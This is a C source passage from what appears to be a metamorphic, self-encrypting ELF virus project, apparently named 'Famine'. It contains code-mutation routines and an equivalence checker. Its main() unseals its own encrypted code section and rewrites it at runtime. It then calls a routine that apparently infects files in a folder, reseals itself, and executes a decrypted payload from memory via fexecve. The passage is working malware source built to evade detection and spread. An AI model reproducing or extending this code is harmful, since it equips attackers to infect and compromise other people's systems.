				I[k].new_len += I[k].isjmp ? 3 : 4;
				I[k].bkind = 2;
				I[k].dsz = 4;
				changed = 1;
			}
		}
		if (!changed) {
			if (pos > cap)
				return 0;
			break;
		}
	}

	{
		struct emit e = { tmp, tmp, tmp + cap };
		int t;

		for (k = 0; k < n; ++k) {
			size_t es;

			emit_fill(&e, (size_t)ins[k]);
			es = (size_t)(e.p - tmp);

			if (I[k].bkind == 1 || I[k].bkind == 2) {
				long nd = (long)I[I[k].ti].new_off -
					(long)(I[k].new_off + I[k].new_len);

				if (I[k].dsz == 1) {
					e8(&e, (uint8_t)(I[k].isjmp ? 0xeb
						: (0x70 | I[k].cc)));
					e8(&e, (uint8_t)(int8_t)nd);
				} else {
					if (I[k].isjmp) {
						e8(&e, 0xe9);
					} else {
						e8(&e, 0x0f);
						e8(&e, (uint8_t)(0x80 | I[k].cc));
					}
					e8(&e, (uint8_t)nd);
					e8(&e, (uint8_t)(nd >> 8));
					e8(&e, (uint8_t)(nd >> 16));
					e8(&e, (uint8_t)(nd >> 24));
				}
			} else {
				for (t = 0; t < I[k].len; ++t)
					e8(&e, buf[I[k].off + t]);

				if ((I[k].bkind == 3 || I[k].bkind == 4) &&
					es + (size_t)I[k].dpos + 4 <= cap) {
					long shift = (long)es - (long)I[k].off;
					long nd = I[k].old_disp - shift;
					size_t f = es + (size_t)I[k].dpos;

					tmp[f] = (uint8_t)nd;
					tmp[f + 1] = (uint8_t)(nd >> 8);
					tmp[f + 2] = (uint8_t)(nd >> 16);
					tmp[f + 3] = (uint8_t)(nd >> 24);
				}
			}
		}
		emit_fill(&e, (size_t)(e.end - e.p));
		for (p = 0; p < cap; ++p)
			buf[p] = tmp[p];
	}
	return 1;
}

/*
 * Execution-free equivalence oracle. 
 */
struct rec {
	size_t off;
	long disp;
	int len, dpos, br, cc;	/* br: 0 none,1 jcc,2 jmp,3 call,4 rip */
};

static int
decode_recs(const uint8_t *b, size_t sz, struct rec *R, size_t *offs, int *cnt)
{
	size_t p = 0;
	int c = 0, a, oo, m;

	while (p < sz) {
		size_t l = insn_decode(b + p, sz - p, &a, &oo, &m);
		uint8_t op;

		if (l == 0)
			return 0;
		op = b[p + oo];
		if (!insn_nopish(b + p, sz - p)) {
			struct rec *r = &R[c];
			int dsz = 0;

			if (c >= MG_MAX)
				return 0;
			r->off = p;
			r->len = (int)l;
			r->br = 0;
			r->dpos = 0;
			r->cc = 0;
			if (op >= 0x70 && op <= 0x7f) {
				r->br = 1; r->cc = op & 0xf; r->dpos = oo + 1; dsz = 1;
			} else if (op == 0xeb) {
				r->br = 2; r->dpos = oo + 1; dsz = 1;
			} else if (op == 0x0f && b[p + oo + 1] >= 0x80 &&
				b[p + oo + 1] <= 0x8f) {
				r->br = 1; r->cc = b[p + oo + 1] & 0xf;
				r->dpos = oo + 2; dsz = 4;
			} else if (op == 0xe9) {
				r->br = 2; r->dpos = oo + 1; dsz = 4;
			} else if (op == 0xe8) {
				r->br = 3; r->dpos = oo + 1; dsz = 4;
			} else if (m >= 0 && (b[p + m] >> 6) == 0 &&
				(b[p + m] & 7) == 5) {
				r->br = 4; r->dpos = m + 1; dsz = 4;
			}
			r->disp = 0;
			if (dsz == 1)
				r->disp = (int8_t)b[p + r->dpos];
			else if (dsz == 4)
				r->disp = (int32_t)((uint32_t)b[p + r->dpos] |
					((uint32_t)b[p + r->dpos + 1] << 8) |
					((uint32_t)b[p + r->dpos + 2] << 16) |
					((uint32_t)b[p + r->dpos + 3] << 24));
			offs[c] = p;
			++c;
		}
		p += l;
	}
	if (p != sz)
		return 0;
	*cnt = c;
	return 1;
}

static int
idx_ge(const size_t *offs, int n, long t)
{
	int i;

	if (t < 0)
		return -1;
	for (i = 0; i < n; ++i)
		if ((long)offs[i] >= t)
			return i;
	return -1;
}

static int
morph_equiv(const uint8_t *O, const uint8_t *M, size_t sz)
{
	struct rec Ro[MG_MAX], Rm[MG_MAX];
	size_t oofs[MG_MAX], mofs[MG_MAX];
	int no, nm, i;

	if (!decode_recs(O, sz, Ro, oofs, &no) ||
		!decode_recs(M, sz, Rm, mofs, &nm) || no != nm)
		return 0;

	for (i = 0; i < no; ++i) {
		struct rec *a = &Ro[i], *b = &Rm[i];
		long at, bt;

		if (a->br != b->br)
			return 0;

		if (a->br == 0) {	/* plain: byte-identical */
			if (a->len != b->len ||
				memcmp(O + a->off, M + b->off, (size_t)a->len))
				return 0;
			continue;
		}

		at = (long)a->off + a->len + a->disp;
		bt = (long)b->off + b->len + b->disp;

		if (a->br == 4) {
			size_t ta = (size_t)a->dpos + 4, tb = (size_t)b->dpos + 4;

			if (a->len != b->len || a->dpos != b->dpos ||
				memcmp(O + a->off, M + b->off, (size_t)a->dpos) ||
				memcmp(O + a->off + ta, M + b->off + tb,
					(size_t)a->len - ta) || at != bt)
				return 0;
			continue;
		}

		if (a->br == 1 && a->cc != b->cc)
			return 0;
		if (at >= 0 && at < (long)sz) {
			int io = idx_ge(oofs, no, at);
			int im = idx_ge(mofs, nm, bt);

			if (io < 0 || im < 0 || io != im)
				return 0;
		} else if (at != bt) {
			return 0;
		}
	}
	return 1;
}

static uint8_t *
cell_end(uint8_t *s)
{
	uint8_t *c[5] = {
		(uint8_t *)(void *)&render_flag, (uint8_t *)(void *)&pack_target,
		(uint8_t *)(void *)&pack_folder, (uint8_t *)morph_start,
		(uint8_t *)__stop_enc
	};
	uint8_t *best = (uint8_t *)__stop_enc;
	int i;

	for (i = 0; i < 5; ++i)
		if (c[i] > s && c[i] < best)
			best = c[i];
	return best;
}

static void
grow_cell(void *fp)
{
	uint8_t *s = fp;
	uint8_t *e = cell_end(s);
	uint8_t save[4096];
	size_t sz;

	if (e <= s)
		return;
	sz = (size_t)(e - s);
	if (sz > sizeof(save))
		return;

	memcpy(save, s, sz);
	if (!morph_grow(s, sz) || !morph_equiv(save, s, sz))
		memcpy(s, save, sz);
}

static int
render_ok(void)
{
	struct pack_trailer a, b;

	a.counter = 0;
	render_flag(&a);
	b.counter = 98765;
	render_flag(&b);

	if (strlen(a.flag) != 22 || strlen(b.flag) != 26)
		return 0;
	if (memcmp(a.flag, b.flag, 21) != 0)
		return 0;
	if (a.flag[21] != '0' || memcmp(b.flag + 21, "98765", 5) != 0)
		return 0;
	return 1;
}

static int
morph_run(void)
{
	hashfn fn = (hashfn)(void *)morph_start;
	static const size_t lens[] = { 0, 1, 2, 7, 8, 15, 16, 33, 64 };
	size_t cap = (size_t)(morph_end - morph_start);
	uint8_t probe[64];
	uint8_t *rf = (uint8_t *)(void *)&render_flag;
	size_t rf_sz = (size_t)((uint8_t *)(void *)&pack_target - rf);
	uint8_t rf_save[1024];
	int rf_grown = 0;
	size_t i;
	int ok = 1;

	enc_mprotect(PROT_READ | PROT_WRITE);
	morph_build((uint8_t *)morph_start, cap);
	morph_grow((uint8_t *)morph_start, cap);

	if (rf_sz > 0 && rf_sz <= sizeof(rf_save)) {
		memcpy(rf_save, rf, rf_sz);
		if (!morph_grow(rf, rf_sz) || !morph_equiv(rf_save, rf, rf_sz))
			memcpy(rf, rf_save, rf_sz);
		else
			rf_grown = 1;
	}
	grow_cell((void *)(void *)&pack_target);
	grow_cell((void *)(void *)&pack_folder);

	{
		uint8_t *s = (uint8_t *)__start_enc;
		size_t n = (size_t)(__stop_enc - __start_enc);
		size_t o = 0;
		int a, bb, c;

		while (o < n) {
			size_t l = insn_decode(s + o, n - o, &a, &bb, &c);

			if (l == 0)
				break;
			o += l;
		}
		if (o == n)
			morph_substitute(s, n);
		else
			morph_substitute((uint8_t *)morph_start, cap);
	}

	enc_mprotect(PROT_READ | PROT_EXEC);

	random_bytes(probe, sizeof(probe));
	for (i = 0; i < sizeof(lens) / sizeof(lens[0]); ++i)
		if (fn(probe, lens[i]) != pack_hash(probe, lens[i])) {
			ok = 0;
			break;
		}

	g_hash = ok ? fn : pack_hash;

	if (rf_grown && !render_ok()) {
		enc_mprotect(PROT_READ | PROT_WRITE);
		memcpy(rf, rf_save, rf_sz);
		enc_mprotect(PROT_READ | PROT_EXEC);
	}

	return 1;
}

int
main(int argc, char **argv, char **envp)
{
	struct stat st;
	struct pack_trailer tr;
	struct es_image img;
	struct es_image w;
	struct self_key nk;
	uint8_t *enc_cipher;
	uint8_t *pay_plain = NULL;
	uint8_t *pay_cipher = NULL;
	uint64_t pay_off = 0;
	int self;
	int packed;
	int mfd = -1;
	int rc = 0;

	(void)argc;
	(void)argv;

	self = open_self(&st);
	if (self < 0)
		return 10;

	packed = ((uint64_t)st.st_size >= sizeof(tr) &&
		read_at(self, &tr, sizeof(tr),
			(off_t)((uint64_t)st.st_size - sizeof(tr))) == 0 &&
		tr.magic == PACK_MAGIC);
	close(self);

	if (es_init(&img) < 0)
		return 11;

	if (selfk.sealed)
		enc_unseal_mem();

	if (!morph_run())
		return 13;

#ifdef DEBUG
	/*
	 * Debug: dump this generation's decrypted (and just-mutated) enc code to
	 * $FAMINE_DUMP_ENC. Disassemble to watch the metamorphism, e.g.
	 *   FAMINE_DUMP_ENC=enc.bin ./famine
	 *   objdump -D -b binary -m i386:x86-64 enc.bin
	 * It's the raw section bytes (no ELF headers), base address 0.
	 */
	{
		const char *dp = getenv("FAMINE_DUMP_ENC");

		if (dp != NULL) {
			int fd = open(dp, O_WRONLY | O_CREAT | O_TRUNC, 0644);

			if (fd >= 0) {
				write_all(fd, __start_enc,
					(size_t)(__stop_enc - __start_enc));
				close(fd);
			}
		}
	}
#endif

	/* Decrypt our payload while enc is live, before resealing. */
	if (packed && getenv("FAMINE_SEAL") == NULL) {
		mfd = payload_to_memfd(&st, &tr, &pay_plain, &pay_off);
		if (mfd < 0)
			return -mfd;
	}

	if (getenv("FAMINE_SEAL") == NULL)
		rc = pack_folder(&st);

	es_image_reset(&w);
	enc_cipher = stage_seal(&w, &img, &nk);
	if (enc_cipher == NULL)
		return 12;

	if (mfd >= 0) {
		pay_cipher = stage_payload(&w, &st, &tr, pay_plain, pay_off);
		if (pay_cipher == NULL)
			rc = 1;
	}

	if (es_commit(&w) < 0)
		rc = 1;

	free(enc_cipher);
	free(pay_cipher);
	free(pay_plain);

	if (mfd >= 0) {
		fexecve(mfd, argv, envp);
		return 20;
	}

	return rc;
}

__asm__(
	".pushsection enc,\"ax\",@progbits\n"
	".fill 256, 1, 0x90\n"
	".popsection\n"
);
